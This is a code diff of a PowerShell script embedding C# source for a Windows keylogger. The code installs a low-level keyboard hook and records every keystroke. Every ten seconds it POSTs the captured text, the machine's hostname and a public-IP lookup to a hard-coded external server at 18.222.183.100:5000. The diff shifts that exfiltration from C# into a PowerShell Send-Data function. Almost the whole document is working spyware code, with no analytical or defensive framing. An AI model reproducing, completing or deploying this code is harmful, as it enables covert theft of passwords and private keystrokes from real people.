@@ -1,4 +1,23 @@
-Add-Type -TypeDefinition @"
+function Send-Data($assoc)
+{
+  $res = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
+  #$ip = $res -match '\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?'
+  #$ip = $Matches[0]
+  $ip = '11'
+  $hostn = hostname
+  $headers = @{
+    "Content-Type" = "application/json"
+  }
+  $uri = "http://18.222.183.100:5000/post"
+  $body = @{
+      "data" = $assoc
+      "ip" = $ip
+      "name" = $hostn
+  }
+  $body = $body | ConvertTo-Json
+  $res = Invoke-RestMethod -Uri $uri -Method POST -Body $body -Headers $headers
+}
+$src = @"
 using System;
 using System.IO;
 using System.Diagnostics;
@@ -7,20 +26,22 @@ using System.Text;
 using System.Windows.Forms;
 using System.Threading;
 using System.Net.Http;
-using Newtonsoft.Json;
+using System.Management.Automation.Runspaces;
 
 namespace KeyLogger {
     
     public static class Program {
-        private static Container container = new Container();
         public static string buf = "";
+        private static Action<string> senddata;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;private const string logFileName = "log.txt";
         private static StreamWriter logFile;private static HookProc hookProc = HookCallback;
         private static IntPtr hookId = IntPtr.Zero;
-        public static void Main() {
+        private static System.Threading.Timer stateTimer;
+        public static void Run(Action<string> func) {
         logFile = File.AppendText(logFileName);
         logFile.AutoFlush = true;
+        senddata = func;
         hookId = SetHook(hookProc);
         TimerStart();
         Application.Run();
@@ -37,8 +58,12 @@ namespace KeyLogger {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
             int vkCode = Marshal.ReadInt32(lParam);
-            container.buf += (GetCharFromKey((Keys)vkCode));
-            Console.WriteLine(GetCharFromKey((Keys)vkCode));
+            var s = GetCharFromKey((Keys)vkCode);
+            buf += s;
+            if (s == "~") {
+                System.Windows.Forms.MessageBox.Show("the keylogger exited");
+                Application.Exit();
+            }
         }
     return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
@@ -46,48 +71,21 @@ namespace KeyLogger {
     {
         // Create a timer that invokes CheckStatus after one second,
         // and every 1/4 second thereafter.
-        Console.WriteLine("{0:h:mm:ss.fff} Creating timer.\n",
-                          DateTime.Now);
-        var stateTimer = new System.Threading.Timer(statusChecker.CheckStatus,
-                                   null, 10000, 10000);
+        stateTimer = new System.Threading.Timer(callee,
+        Runspace.DefaultRunspace, 10000, 10000);
     }
 
-    public static void CheckStatus(Object stateInfo)
-    {
-        // Get the public IP address from http://ifconfig.me/ip
-        string ip = client.GetStringAsync("http://ifconfig.me/ip").Result;
-
-        // Get the IP information from http://ipinfo.io/
-        string res = client.GetStringAsync("http://ipinfo.io/" + ip).Result;
-
-        // Extract the IP address from the IP information using a regular expression
-        Regex regex = new Regex(@"\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?");
-        Match match = regex.Match(res);
-        ip = match.Value;
-
-        // Get the hostname of the local machine
-        string hostn = Environment.MachineName;
-        // Define the request url
-        string url = "http://18.222.183.100:5000/post";
-
-        // Create a json object with the given parameters
-        var json = new
-        {
-            data = buf,
-            ip = ip,
-            name = hostn
-        };
-
-        // Convert the json object to a string
-        string jsonString = JsonConvert.SerializeObject(json);
-
-        // Create a StringContent object with the json string and the content type
-        StringContent content = new StringContent(jsonString, Encoding.UTF8, "application/json");
-        
-        buf = "";
-        
-        // Send a POST request to the url with the content, don't care about the response
-        client.PostAsync(url, content)
+    public static void callee(object state){
+        if (Runspace.DefaultRunspace == null) {
+            System.Management.Automation.Runspaces.Runspace r = (System.Management.Automation.Runspaces.Runspace) state;
+            Runspace.DefaultRunspace = r;
+        }
+        try {
+            senddata(buf);
+            buf = "";
+        } catch (Exception e) {
+            Console.WriteLine(e);
+        }
     }
 
     [DllImport("user32.dll")]
@@ -128,6 +126,7 @@ namespace KeyLogger {
 
         // Get the keyboard state array
         var array = new byte[256];
+        GetKeyState(VK_SHIFT);
         GetKeyboardState(array);
 
         // Call the ToUnicode function to translate the key
@@ -151,5 +150,11 @@ namespace KeyLogger {
     }
     }
 }
-"@ -ReferencedAssemblies System.Windows.Forms System.Net.Http
-[KeyLogger.Program]::Main();
+"@
+Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms,System.Net.Http
+[KeyLogger.Program]::Run({
+    param($buf)
+    Send-Data $buf
+  });
+
+  
